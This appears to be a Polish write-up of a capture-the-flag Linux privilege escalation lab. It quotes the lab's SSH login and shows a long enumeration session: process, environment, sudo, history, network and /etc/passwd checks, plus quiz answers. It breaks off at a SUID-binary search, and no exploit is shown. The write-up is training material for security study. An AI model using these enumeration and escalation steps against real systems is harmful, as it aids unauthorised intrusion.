# Linux Privilege Escalation (task 12)

![](/grafika/linux_privilege_escalation_caly_pokoj.png)

![](/grafika/task12.png)
```
Do tej pory dość dobrze rozumiesz główne wektory eskalacji uprawnień w systemie Linux , a to wyzwanie powinno być dość łatwe.

Uzyskałeś dostęp SSH do dużej placówki naukowej. Spróbuj podnieść swoje uprawnienia, aż zostaniesz rootem.
Zaprojektowaliśmy tę salę, aby pomóc Ci zbudować dogłębną metodologię eskalacji uprawnień w systemie Linux, która będzie bardzo przydatna podczas egzaminów takich jak OSCP i testów penetracyjnych.

Nie pozostawiaj niezbadanego wektora eskalacji uprawnień, eskalacja uprawnień jest często bardziej sztuką niż nauką.

Możesz uzyskać dostęp do maszyny docelowej za pośrednictwem przeglądarki lub użyć poniższych poświadczeń SSH.

Nazwa użytkownika: leonard
Hasło: Penny123
```
### Wyliczanie

Po zalogowaniu za pomocą podanych uprawnień sprawdzam jakie mogę uzyskać informację o systemie.

```
ssh leonard@10.10.171.81
The authenticity of host '10.10.171.81 (10.10.171.81)' can't be established.
ED25519 key fingerprint is SHA256:1dMTd32PB7hStUUoiefpE+ckRSQl9B6tlu4mBNO2v4k.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:45: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.171.81' (ED25519) to the list of known hosts.
(leonard@10.10.171.81) Password: 
Last login: Mon Jun  7 21:18:33 2021

[leonard@ip-10-10-171-81 ~]$ id
uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[leonard@ip-10-10-171-81 ~]$ whoami
leonard

[leonard@ip-10-10-171-81 ~]$ hostnme
bash: hostnme: command not found...

[leonard@ip-10-10-171-81 ~]$ hostname
ip-10-10-171-81

[leonard@ip-10-10-171-81 ~]$ uname -a
Linux ip-10-10-171-81 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

[leonard@ip-10-10-171-81 ~]$ cat /proc/version
Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020

[leonard@ip-10-10-171-81 ~]$ cat /etc/issue
\S
Kernel \r on an \m

[leonard@ip-10-10-171-81 ~]$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  1.4  0.7 128652  7300 ?        Ss   16:55   0:14 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root         2  0.0  0.0      0     0 ?        S    16:55   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        S<   16:55   0:00 [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        S    16:55   0:00 [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        S    16:55   0:00 [ksoftirqd/0]
root         7  0.0  0.0      0     0 ?        S    16:55   0:00 [migration/0]
root         8  0.0  0.0      0     0 ?        S    16:55   0:00 [rcu_bh]
root         9  0.3  0.0      0     0 ?        R    16:55   0:03 [rcu_sched]
root        10  0.0  0.0      0     0 ?        S<   16:55   0:00 [lru-add-drain]
root        11  0.1  0.0      0     0 ?        S    16:55   0:01 [watchdog/0]
root        13  0.0  0.0      0     0 ?        S    16:55   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   16:55   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    16:55   0:00 [xenwatch]
root        16  0.0  0.0      0     0 ?        S    16:55   0:00 [xenbus]
root        17  0.0  0.0      0     0 ?        S    16:55   0:00 [kworker/0:1]
root        18  0.0  0.0      0     0 ?        S    16:55   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S<   16:55   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S<   16:55   0:00 [kintegrityd]
root        21  0.0  0.0      0     0 ?        S<   16:55   0:00 [bioset]
root        22  0.0  0.0      0     0 ?        S<   16:55   0:00 [bioset]
root        23  0.0  0.0      0     0 ?        S<   16:55   0:00 [bioset]
root        24  0.0  0.0      0     0 ?        S<   16:55   0:00 [kblockd]
root        25  0.0  0.0      0     0 ?        S<   16:55   0:00 [md]
root        26  0.0  0.0      0     0 ?        S<   16:55   0:00 [edac-poller]
root        27  0.0  0.0      0     0 ?        S<   16:55   0:00 [watchdogd]
root        32  0.0  0.0      0     0 ?        S    16:55   0:00 [kswapd0]
root        33  0.0  0.0      0     0 ?        SN   16:55   0:00 [ksmd]
root        34  0.0  0.0      0     0 ?        SN   16:55   0:00 [khugepaged]
root        35  0.0  0.0      0     0 ?        S<   16:55   0:00 [crypto]
root        43  0.0  0.0      0     0 ?        S<   16:55   0:00 [kthrotld]
root        44  0.0  0.0      0     0 ?        S    16:55   0:00 [kworker/u30:1]
root        45  0.0  0.0      0     0 ?        S<   16:55   0:00 [kmpath_rdacd]
root        46  0.0  0.0      0     0 ?        S<   16:55   0:00 [kaluad]
root        47  0.0  0.0      0     0 ?        S<   16:55   0:00 [kpsmoused]
root        48  0.0  0.0      0     0 ?        S<   16:55   0:00 [ipv6_addrconf]
root        62  0.0  0.0      0     0 ?        S<   16:55   0:00 [deferwq]
root       100  0.0  0.0      0     0 ?        S    16:56   0:00 [kauditd]
root       281  0.0  0.0      0     0 ?        S<   16:56   0:00 [ata_sff]
root       282  0.0  0.0      0     0 ?        S    16:56   0:00 [scsi_eh_0]
root       283  0.0  0.0      0     0 ?        S<   16:56   0:00 [scsi_tmf_0]
root       284  0.0  0.0      0     0 ?        S    16:56   0:00 [scsi_eh_1]
root       285  0.0  0.0      0     0 ?        S<   16:56   0:00 [scsi_tmf_1]
root       348  0.0  0.0      0     0 ?        S<   16:56   0:00 [kdmflush]
root       349  0.0  0.0      0     0 ?        S<   16:56   0:00 [bioset]
root       358  0.0  0.0      0     0 ?        S<   16:56   0:00 [kdmflush]
root       359  0.0  0.0      0     0 ?        S<   16:56   0:00 [bioset]
root       372  0.0  0.0      0     0 ?        S<   16:56   0:00 [bioset]
root       373  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfsalloc]
root       374  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs_mru_cache]
root       375  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-buf/dm-0]
root       376  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-data/dm-0]
root       377  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-conv/dm-0]
root       378  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-cil/dm-0]
root       379  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-reclaim/dm-]
root       380  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-log/dm-0]
root       381  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-eofblocks/d]
root       382  0.0  0.0      0     0 ?        S    16:56   0:00 [xfsaild/dm-0]
root       383  0.0  0.0      0     0 ?        S<   16:56   0:00 [kworker/0:1H]
root       465  0.3  0.3  38544  3064 ?        Ss   16:56   0:03 /usr/lib/systemd/systemd-journald
root       484  0.0  0.0      0     0 ?        S    16:56   0:00 [afs_pagecopy]
root       499  0.0  0.5 127372  5444 ?        Ss   16:56   0:00 /usr/sbin/lvmetad -f
root       514  0.3  0.5  49420  5788 ?        Ss   16:56   0:03 /usr/lib/systemd/systemd-udevd
root       624  0.0  0.0      0     0 ?        S<   16:56   0:00 [ttm_swap]
root       741  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-buf/xvda1]
root       742  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-data/xvda1]
root       743  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-conv/xvda1]
root       744  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-cil/xvda1]
root       745  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-reclaim/xvd]
root       746  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-log/xvda1]
root       747  0.0  0.0      0     0 ?        S<   16:56   0:00 [xfs-eofblocks/x]
root       749  0.0  0.0      0     0 ?        S    16:56   0:00 [xfsaild/xvda1]
root       802  0.0  0.0      0     0 ?        S<   16:56   0:00 [rpciod]
root       803  0.0  0.0      0     0 ?        S<   16:56   0:00 [xprtiod]
root       808  0.0  0.0  55532   848 ?        S<sl 16:56   0:00 /sbin/auditd
root       810  0.0  0.0  84556   828 ?        S<sl 16:56   0:00 /sbin/audispd
root       812  0.0  0.1  55624  1648 ?        S<   16:56   0:00 /usr/sbin/sedispatch
root       833  0.0  0.5 228156  5616 ?        Ss   16:56   0:00 /usr/sbin/abrtd -d -s
root       835  0.0  0.4 225840  4820 ?        Ss   16:56   0:00 /usr/bin/abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected er
root       836  0.0  0.4 225840  4820 ?        Ss   16:56   0:00 /usr/bin/abrt-watch-log -F Backtrace /var/log/Xorg.0.log -- /usr/bin/abrt-dump-xorg -xD
root       843  2.2  0.3  90568  3248 ?        Ss   16:56   0:20 /sbin/rngd -f
polkitd    845  0.2  1.3 616360 13816 ?        Ssl  16:56   0:02 /usr/lib/polkit-1/polkitd --no-debug
root       846  0.0  0.6 451172  6260 ?        Ssl  16:56   0:00 /usr/libexec/udisks2/udisksd
rpc        850  0.0  0.0  69256  1004 ?        Ss   16:56   0:00 /sbin/rpcbind -w
rtkit      855  0.0  0.1 198784  1772 ?        SNsl 16:57   0:00 /usr/libexec/rtkit-daemon
root       856  0.0  0.3 396456  4048 ?        Ssl  16:57   0:00 /usr/libexec/accounts-daemon
dbus       857  0.4  0.3  69740  3544 ?        Ssl  16:57   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
nscd       860  0.1  0.2 703304  2132 ?        Ssl  16:57   0:00 /usr/sbin/nscd
libstor+   893  0.0  0.0   8580   836 ?        Ss   16:57   0:00 /usr/bin/lsmd -d
avahi      899  0.0  0.2  62264  2244 ?        Ss   16:57   0:00 avahi-daemon: running [linux.local]
root       903  0.0  0.2  52792  2664 ?        Ss   16:57   0:00 /usr/sbin/smartd -n -q never
root       904  0.0  0.1  26436  1812 ?        Ss   16:57   0:00 /usr/lib/systemd/systemd-logind
chrony     907  0.0  0.1  98868  1644 ?        S    16:57   0:00 /usr/sbin/chronyd
root       908  0.0  0.1 201428  1260 ?        Ssl  16:57   0:00 /usr/sbin/gssproxy -D
avahi      912  0.0  0.0  62140   400 ?        S    16:57   0:00 avahi-daemon: chroot helper
root       922  0.0  0.0   7128   296 ?        Ss   16:57   0:00 /usr/sbin/mcelog --ignorenodev --daemon --syslog
root       941  0.6  2.9 358812 29568 ?        Ssl  16:57   0:06 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid
root       951  0.0  0.0 115408   956 ?        S    16:57   0:00 /bin/bash /usr/sbin/ksmtuned
root       985  0.1  0.8 476632  8820 ?        Ssl  16:57   0:01 /usr/sbin/NetworkManager --no-daemon
root      1419  0.0  0.2 100992  2164 ?        Ss   16:57   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid eth0
root      1495  0.2  1.9 574532 19592 ?        Ssl  16:58   0:02 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root      1498  0.0  0.4 112900  4332 ?        Ss   16:58   0:00 /usr/sbin/sshd -D
root      1503  0.0  0.3 198072  4016 ?        Ss   16:58   0:00 /usr/sbin/cupsd -f
root      1506  0.0  1.9 900844 20208 ?        Ssl  16:58   0:00 /usr/bin/amazon-ssm-agent
root      1509  0.1  0.4 214540  4696 ?        Ssl  16:58   0:00 /usr/sbin/rsyslogd -n
root      1527  0.2  1.8 941252 18244 ?        Ssl  16:58   0:02 /usr/sbin/libvirtd
root      1546  0.0  0.4 481412  4528 ?        Ssl  16:58   0:00 /usr/sbin/gdm
root      1547  0.0  0.0 110204   876 ttyS0    Ss+  16:58   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
root      1549  1.1  0.1 126384  1684 ?        Ss   16:58   0:09 /usr/sbin/crond -n
root      1551  0.0  0.0  25908   936 ?        Ss   16:58   0:00 /usr/sbin/atd -f
root      1591  0.3  2.5 305740 25744 tty1     Ssl+ 16:58   0:02 /usr/bin/X :0 -background none -noreset -audit 4 -verbose -auth /run/gdm/auth-for-gdm-U0adJb/database 
root      1601  0.2  3.4 923760 35320 ?        Sl   16:58   0:02 /usr/bin/ssm-agent-worker
root      1677  0.4  0.5 158944  5820 ?        Ss   16:58   0:03 sshd: leonard [priv]
nobody    1902  0.0  0.1  55960  1076 ?        S    16:58   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/
root      1903  0.0  0.0  55932   392 ?        S    16:58   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/
root      1932  0.0  0.5 376760  5328 ?        Sl   16:58   0:00 gdm-session-worker [pam/gdm-launch-environment]
gdm       1977  0.1  0.8 744904  8876 ?        Ssl  16:58   0:01 /usr/libexec/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       2029  0.0  0.0  58884   944 ?        S    16:58   0:00 dbus-launch --exit-with-session /usr/libexec/gnome-session-binary --autostart /usr/share/gdm/greeter/a
root      2051  0.0  0.2 101344  2352 ?        Ss   16:58   0:00 sendmail: accepting connections
leonard   2056  0.0  0.2 158944  2544 ?        S    16:58   0:00 sshd: leonard@pts/0
leonard   2060  0.0  0.3 116896  3456 pts/0    Ss   16:58   0:00 -bash
smmsp     2086  0.0  0.1  84292  1936 ?        Ss   16:58   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
gdm       2096  0.1  0.1  68692  2016 ?        Ssl  16:59   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
gdm       2106  0.0  0.3 346836  3664 ?        Sl   16:59   0:00 /usr/libexec/at-spi-bus-launcher
gdm       2112  0.0  0.2  68392  2408 ?        Sl   16:59   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-add
gdm       2116  0.0  0.3 233096  3924 ?        Sl   16:59   0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
gdm       2142  2.6 12.3 2915052 124820 ?      Sl   16:59   0:20 /usr/bin/gnome-shell
root      2166  0.0  0.4 422160  4952 ?        Ssl  16:59   0:00 /usr/libexec/upowerd
gdm       2219  0.0  0.3 1171560 3528 ?        S<l  16:59   0:00 /usr/bin/pulseaudio --start --log-target=syslog
gdm       2254  0.0  0.7 453100  7376 ?        Sl   16:59   0:00 ibus-daemon --xim --panel disable
gdm       2258  0.0  0.3 375984  3448 ?        Sl   16:59   0:00 /usr/libexec/ibus-dconf
gdm       2261  0.1  1.3 464772 13520 ?        Sl   16:59   0:00 /usr/libexec/ibus-x11 --kill-daemon
gdm       2265  0.0  0.3 375964  3348 ?        Sl   16:59   0:00 /usr/libexec/ibus-portal
gdm       2278  0.0  0.2 364704  2624 ?        Sl   16:59   0:00 /usr/libexec/xdg-permission-store
root      2291  0.0  0.3 398680  3988 ?        Ssl  16:59   0:00 /usr/libexec/boltd
root      2298  0.0  0.3  78660  3360 ?        Ss   16:59   0:00 /usr/sbin/wpa_supplicant -u -f /var/log/wpa_supplicant.log -c /etc/wpa_supplicant/wpa_supplicant.conf 
root      2301  0.0  0.5 410528  5300 ?        Ssl  16:59   0:00 /usr/libexec/packagekitd
gdm       2303  0.1  1.4 615284 14956 ?        Sl   16:59   0:01 /usr/libexec/gsd-xsettings
gdm       2305  0.0  0.3 376500  3220 ?        Sl   16:59   0:00 /usr/libexec/gsd-a11y-settings
gdm       2308  0.1  1.3 464388 13348 ?        Sl   16:59   0:01 /usr/libexec/gsd-clipboard
gdm       2310  0.1  1.4 714032 14532 ?        Sl   16:59   0:01 /usr/libexec/gsd-color
gdm       2312  0.0  0.7 465484  7972 ?        Sl   16:59   0:00 /usr/libexec/gsd-datetime
gdm       2313  0.0  0.3 380716  3096 ?        Sl   16:59   0:00 /usr/libexec/gsd-housekeeping
gdm       2319  0.1  1.3 614112 13408 ?        Sl   16:59   0:00 /usr/libexec/gsd-keyboard
gdm       2321  0.1  1.7 1011816 17276 ?       Sl   16:59   0:01 /usr/libexec/gsd-media-keys
gdm       2324  0.0  0.2 300448  2852 ?        Sl   16:59   0:00 /usr/libexec/gsd-mouse
gdm       2331  0.1  1.4 705412 14424 ?        Sl   16:59   0:01 /usr/libexec/gsd-power
gdm       2332  0.0  0.4 363176  4528 ?        Sl   16:59   0:00 /usr/libexec/gsd-print-notifications
gdm       2334  0.0  0.3 317676  3096 ?        Sl   16:59   0:00 /usr/libexec/gsd-rfkill
gdm       2336  0.0  0.2 374184  2968 ?        Sl   16:59   0:00 /usr/libexec/gsd-screensaver-proxy
gdm       2337  0.0  0.4 411508  4148 ?        Sl   16:59   0:00 /usr/libexec/gsd-sharing
gdm       2339  0.0  0.4 472236  4980 ?        Sl   16:59   0:00 /usr/libexec/gsd-smartcard
gdm       2341  0.0  0.6 455000  6760 ?        Sl   16:59   0:00 /usr/libexec/gsd-sound
gdm       2354  0.1  1.3 549104 13840 ?        Sl   16:59   0:01 /usr/libexec/gsd-wacom
colord    2366  0.0  0.6 419568  6164 ?        Ssl  16:59   0:00 /usr/libexec/colord
gdm       2453  0.0  0.3 302168  3296 ?        Sl   17:00   0:00 /usr/libexec/ibus-engine-simple
root      2600  0.0  0.0 123360   728 ?        Ss   17:01   0:00 /usr/sbin/anacron -s
root      2706  0.0  0.0      0     0 ?        R    17:02   0:00 [kworker/0:0]
root      3263  0.0  0.0 108052   352 ?        S    17:11   0:00 sleep 60
leonard   3302  0.0  0.1 155448  1860 pts/0    R+   17:12   0:00 ps aux

[leonard@ip-10-10-171-81 ~]$ env
XDG_SESSION_ID=1
HOSTNAME=ip-10-10-171-81
SELINUX_ROLE_REQUESTED=
TERM=xterm-256color
SHELL=/bin/bash
HISTSIZE=1000
TMPDIR=/tmp/leonard
SSH_CLIENT=10.8.78.81 51588 22
PERL5LIB=/home/leonard/perl5/lib/perl5:
SELINUX_USE_CURRENT_RANGE=
QTDIR=/usr/lib64/qt-3.3
QTINC=/usr/lib64/qt-3.3/include
PERL_MB_OPT=--install_base /home/leonard/perl5
SSH_TTY=/dev/pts/0
QT_GRAPHICSSYSTEM_CHECKED=1
USER=leonard
LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:
CASTOR_HOME=/castor/cern.ch/user/l/leonard
MAIL=/var/spool/mail/leonard
PATH=/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin
PWD=/home/leonard
EDITOR=/bin/nano -w
LANG=en_US.UTF-8
QT_GRAPHICSSYSTEM=native
KDEDIRS=/usr
SELINUX_LEVEL_REQUESTED=
HISTCONTROL=ignoredups
SHLVL=1
HOME=/home/leonard
PERL_LOCAL_LIB_ROOT=:/home/leonard/perl5
LOGNAME=leonard
QTLIB=/usr/lib64/qt-3.3/lib
XDG_DATA_DIRS=/home/leonard/.local/share/flatpak/exports/share:/var/lib/flatpak/exports/share:/usr/local/share:/usr/share
SSH_CONNECTION=10.8.78.81 51588 10.10.171.81 22
LESSOPEN=||/usr/bin/lesspipe.sh %s
XDG_RUNTIME_DIR=/run/user/1000
QT_PLUGIN_PATH=/usr/lib64/kde4/plugins:/usr/lib/kde4/plugins
PERL_MM_OPT=INSTALL_BASE=/home/leonard/perl5
_=/usr/bin/env

[leonard@ip-10-10-171-81 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-10-171-81.

[leonard@ip-10-10-171-81 ~]$ ls -la
total 28
drwx------. 7 leonard leonard 197 Jun  7  2021 .
drwxr-xr-x. 5 root    root     50 Jun  7  2021 ..
-rw-------. 1 leonard leonard 142 Jun  7  2021 .bash_history
-rw-r--r--. 1 leonard leonard  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 leonard leonard 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 leonard leonard 231 Apr  1  2020 .bashrc
drwxrwxr-x. 3 leonard leonard  18 Jun  7  2021 .cache
drwxrwxr-x. 3 leonard leonard  18 Jun  7  2021 .config
-rw-r--r--. 1 leonard leonard 334 Nov 27  2019 .emacs
-rw-r--r--. 1 leonard leonard 172 Apr  1  2020 .kshrc
drwxrwxr-x. 3 leonard leonard  19 Jun  7  2021 .local
drwxr-xr-x. 4 leonard leonard  39 Jun  7  2021 .mozilla
drwxrwxr-x. 2 leonard leonard   6 Jun  7  2021 perl5
-rw-r--r--. 1 leonard leonard 658 Apr  7  2020 .zshrc

[leonard@ip-10-10-171-81 ~]$ pwd
/home/leonard

[leonard@ip-10-10-171-81 ~]$ id
uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[leonard@ip-10-10-171-81 ~]$ cat /etc/passwd | grep home
leonard:x:1000:1000:leonard:/home/leonard:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash
[leonard@ip-10-10-171-81 ~]$ history
    1  ls
    2  cd ..
    3  exit
    4  ls
    5  cd çç
    6  cd ..
    7  ls
    8  cd home/
    9  ls
   10  cd missy/
   11  su missy 
   12  ls
   13  cd ..
   14  ls
   15  cd rootflag/
   16  ls
   17  cat flag2.txt 
   18  su root
   19  ls
   20  cd rootflag/
   21  su missy
   22  id
   23  whoami
   24  hostnme
   25  hostname
   26  uname -a
   27  cat /proc/version
   28  cat /etc/issue
   29  ps aux
   30  env
   31  sudo -l
   32  ls -la
   33  pwd
   34  id
   35  cat /etc/passwd
   36  cat /etc/passwd | grep home
   37  history

[leonard@ip-10-10-171-81 ~]$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.171.81  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::dc:9fff:fed5:823b  prefixlen 64  scopeid 0x20<link>
        ether 02:dc:9f:d5:82:3b  txqueuelen 1000  (Ethernet)
        RX packets 659  bytes 58852 (57.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 520  bytes 79316 (77.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:1b:aa:dc  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[leonard@ip-10-10-171-81 ~]$ ip route
default via 10.10.0.1 dev eth0 
10.10.0.0/16 dev eth0 proto kernel scope link src 10.10.171.81 
169.254.0.0/16 dev eth0 scope link metric 1002 
192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1 

[leonard@ip-10-10-171-81 ~]$ netstat -ltp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:sunrpc          0.0.0.0:*               LISTEN      -                   
tcp        0      0 ip-192-168-122-1:domain 0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:ipp           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:smtp            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 [::]:sunrpc             [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
tcp6       0      0 localhost:ipp           [::]:*                  LISTEN      -                   

[leonard@ip-10-10-171-81 ~]$ netstat -i
Kernel Interface table
Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
eth0             9001      746      0      0 0           574      0      0      0 BMRU
lo              65536        0      0      0 0             0      0      0      0 LRU
virbr0           1500        0      0      0 0             0      0      0      0 BMU

[leonard@ip-10-10-171-81 ~]$ python --version
Python [leonard@ip-10-10-171-81 ~]$ python --version
Python 2.7.5

[leonard@ip-10-10-171-81 ~]$ lsb_release -a
LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarch
Distributor ID: CentOS
Description:    CentOS Linux release 7.9.2009 (Core) 
Release:        7.9.2009
Codename:       Core

```
Niestety polecenie ```find / -type f -name "flag*.txt" 2>/dev/null | grep -v "Permission denied"``` nic mi nie pokazuje.

### Eskalacja uprawnień: exploity jądra

1. Jaka jest nazwa hosta systemu docelowego?

    ```ip-10-10-171-81```

2. Jaka jest wersja jądra Linux systemu docelowego?
    
    ```3.10.0-1160.el7.x86_64```

3. Co to za Linux?

    ```CentOS```

4. Jaka wersja języka Python jest zainstalowana w systemie?

    ```Python 2.7.5```

5. Jaka luka wydaje się mieć wpływ na jądro docelowego systemu? (Wprowadź numer CVE )

    ```Niestety, na moment rozwiązywania tego zadania nie udało mi się znaleźć łatwo wykorzystywalnej podatności.```
### Eskalacja uprawnień: Sudo

Następnie przeglądam informacje, które zebrałem wcześniej. Niestety, nie mam uprawnień do korzystania z jakichkolwiek aplikacji z wykorzystaniem ```sudo```. 

```
[leonard@ip-10-10-171-81 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for leonard: 
Sorry, user leonard may not run sudo on ip-10-10-171-81.
```

### 

Polecenie ```find / -type f -perm -04000 -ls 2>/dev/null``` wyświetla listę plików, które mają ustawione bity SUID lub SGID.
```
[leonard@ip-10-10-58-95 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
